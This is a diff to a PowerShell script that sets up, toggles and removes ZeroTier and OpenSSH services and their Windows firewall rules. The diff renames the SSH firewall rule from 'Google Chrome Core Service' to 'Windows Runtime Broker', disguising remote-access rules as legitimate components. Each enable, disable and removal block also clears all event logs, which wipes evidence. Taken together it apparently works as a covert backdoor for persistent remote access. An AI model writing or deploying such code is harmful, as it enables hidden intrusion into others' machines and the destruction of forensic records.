@@ -4,7 +4,10 @@ $ztservice = "ZeroTierOneService"
 $sshdservice = "sshd"
 $sshagentservice = "ssh-agent"
 $ztfirewall = "ZeroTier One"
-$sshfirewall = "Google Chrome Core Service"
+$ztfirewall2 = "ZeroTier x64 Binary In"
+$ztfirewall3 = "ZeroTier UDP/9993 In"
+$ssholdfirewall = "Google Chrome Core Service"
+$sshfirewall = "Windows Runtime Broker"
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
@@ -230,6 +233,8 @@ if ($storedCode -ne $null) {
 							Start-ServiceSafe -ServiceName $sshagentservice
 							Start-ServiceSafe -ServiceName $sshdservice
 							Enable-FirewallRules -ruleName $ztfirewall
+							Enable-FirewallRules -ruleName $ztfirewall2
+							Enable-FirewallRules -ruleName $ztfirewall3
 							Enable-FirewallRules -ruleName $sshfirewall
 							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
@@ -242,7 +247,10 @@ if ($storedCode -ne $null) {
 							Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
 							Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
 							Disable-FirewallRules -ruleName $ztfirewall
+							Disable-FirewallRules -ruleName $ztfirewall2
+							Disable-FirewallRules -ruleName $ztfirewall3
 							Disable-FirewallRules -ruleName $sshfirewall
+							Disable-FirewallRules -ruleName $ssholdfirewall
 							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
@@ -284,9 +292,15 @@ if ($storedCode -ne $null) {
 							Delete-ServiceSafe -ServiceName sshd
 							Delete-ServiceSafe -ServiceName ssh-agent							
 							Disable-FirewallRules -ruleName $ztfirewall
+							Disable-FirewallRules -ruleName $ztfirewall2
+							Disable-FirewallRules -ruleName $ztfirewall3
 							Disable-FirewallRules -ruleName $sshfirewall
+							Disable-FirewallRules -ruleName $ssholdfirewall
 							Remove-FirewallRuleSafe -RuleName $ztfirewall
-							Remove-FirewallRuleSafe -RuleName $sshfirewall							
+							Remove-FirewallRuleSafe -ruleName $ztfirewall2
+							Remove-FirewallRuleSafe -ruleName $ztfirewall3
+							Remove-FirewallRuleSafe -RuleName $sshfirewall
+							Remove-FirewallRuleSafe -ruleName $ssholdfirewall
 							Delete-Directories -directories $ztdir
 							Delete-Directories -directories $sshdir
 							Delete-Directories -directories $sshdatadir
